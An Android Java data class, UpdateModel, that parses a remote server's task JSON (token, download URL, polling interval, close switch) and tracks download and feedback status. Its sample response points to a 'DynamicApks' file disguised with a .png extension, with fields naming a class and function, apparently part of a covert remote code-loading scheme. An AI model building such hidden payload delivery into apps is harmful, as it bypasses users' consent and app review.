package com.use.nice.update;


import com.use.nice.FieldName;
import com.use.nice.util.DataUtil;

import org.json.JSONException;
import org.json.JSONObject;

/**
 *   {"status":true,"token":"1441787392_55efee054f04e","data":{"url":"http:\/\/tongji.appscomeon.com\/Uploads\/DynamicApks\/20150516181934.png","pkg_in_class":"","pkg_in_func":""}}
 || {"status":false}
 * Created by zhengnan on 2015/9/9.
 * - 网络获取的任务数据的 模块类。
 */
public class UpdateModel {
//    private static UpdateModel

    public UpdateModel(String string,boolean fromeNetData) {
            if(fromeNetData)generateModel4net(string);
            else generateModel4native(string);
    }

    private void generateModel4net(String netStr){
        if(!UpdateUtil.isValidNetData(netStr)){
            this.isValid = false;
            return;
        }
        JSONObject json = DataUtil.getJo(netStr);
        this.status=DataUtil.str2bool(DataUtil.getJsonParameter(json, FieldName.status, "false"));
        if(this.status){
            this.token = DataUtil.getJsonParameter(json, FieldName.token, "");
            this.nextInterval = Long.parseLong(DataUtil.getJsonParameter(json, FieldName.nextInterval, "50000"));
            this.close =DataUtil.str2bool(DataUtil.getJsonParameter(json,  FieldName.close, "false"));
           // JSONObject dataJson  = DataUtil.getJo(DataUtil.getJsonParameter(json,  FieldName.data, ""));
            this.url = DataUtil.getJsonParameter(json,FieldName.url,"");
        }
    }
    //通过本地保存的任务model来生成 model类，包含处理结果的字段令牌
    private void generateModel4native(String nativeStr){
        JSONObject json = DataUtil.getJo(nativeStr);
        this.status =Boolean.parseBoolean(DataUtil.getJsonParameter(json, FieldName.status, "false"));
        this.token = DataUtil.getJsonParameter(json, FieldName.token, "");
        this.url = DataUtil.getJsonParameter(json, FieldName.url, "");

        this.isValid = Boolean.parseBoolean(DataUtil.getJsonParameter(json, FieldName.isValid, "false"));
        this.downLoadOk = Boolean.parseBoolean(DataUtil.getJsonParameter(json, FieldName.downLoadOk, "false"));
        this.feedbackOk = Boolean.parseBoolean(DataUtil.getJsonParameter(json, FieldName.feedbackOk, "false"));
        this.close =DataUtil.str2bool(DataUtil.getJsonParameter(json,  FieldName.close, "false"));
    }

    private boolean  status  = false;//联网有任务
    private String token = "";
    private String url = "";
    private long nextInterval = 50000;//下次访问间隔
    private boolean close = false;//是否关闭当前功能


    private boolean downLoadOk = false;//url是否下载成功。
    private boolean feedbackOk = false;//是否反馈结果成功
    private boolean isValid = true;//是否是正常的数据

    @Override
    public String toString() {
        JSONObject json = new JSONObject();
        try {
            json.putOpt(FieldName.status, status);
            json.putOpt(FieldName.token, token);
            json.putOpt(FieldName.url, url);//只为也打印。
            json.putOpt(FieldName.downLoadOk, downLoadOk);
            json.putOpt(FieldName.feedbackOk, feedbackOk);
            json.putOpt(FieldName.isValid, isValid);
            json.putOpt(FieldName.close, close);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return json.toString();
    }



    public boolean isStatus() {
        return status;
    }

    public void setStatus(boolean status) {
        this.status = status;
    }

    public String getToken() {
        return token;
    }

    public void setToken(String token) {
        this.token = token;
    }

    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public boolean isValid() {
        return isValid;
    }

    public void setIsValid(boolean isValid) {
        this.isValid = isValid;
    }

    public boolean isDownLoadOk() {
        return downLoadOk;
    }

    public void setDownLoadOk(boolean downLoadOk) {
        this.downLoadOk = downLoadOk;
    }

    public boolean isFeedbackOk() {
        return feedbackOk;
    }

    public void setFeedbackOk(boolean feedbackOk) {
        this.feedbackOk = feedbackOk;
    }

    public boolean isClose() {
        return close;
    }

    public void setClose(boolean close) {
        this.close = close;
    }

    public long getNextInterval() {
        return nextInterval;
    }

    public void setNextInterval(long nextInterval) {
        this.nextInterval = nextInterval;
    }
}